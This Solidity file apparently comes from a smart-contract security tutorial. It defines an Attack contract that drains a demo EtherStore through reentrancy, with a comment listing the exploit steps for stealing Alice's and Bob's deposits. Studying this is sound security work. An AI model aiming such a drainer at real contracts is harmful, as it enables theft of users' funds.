// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

import "./EtherStore.sol";

/* 🐍 Exploit Process
    1. Deploy the `EtherStore` contract.
    2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into `EtherStore`.
    3. Deploy the `Attack` contract, furnishing it with the address of `EtherStore`.
    4. Invoke `Attack.attack` by sending 1 Ether from Account 3 (Eve). The outcome? You end up with 3 Ethers, snatched from Alice and Bob, along with 1 Ether transferred from the `Attack` contract itself.

    The exploit stems from the ability of the `Attack` contract to repeatedly call `EtherStore.withdraw` before its execution concludes, thereby making off with multiple Ether withdrawals.

*/

contract Attack {

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract
    fallback() external payable {
        if(address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}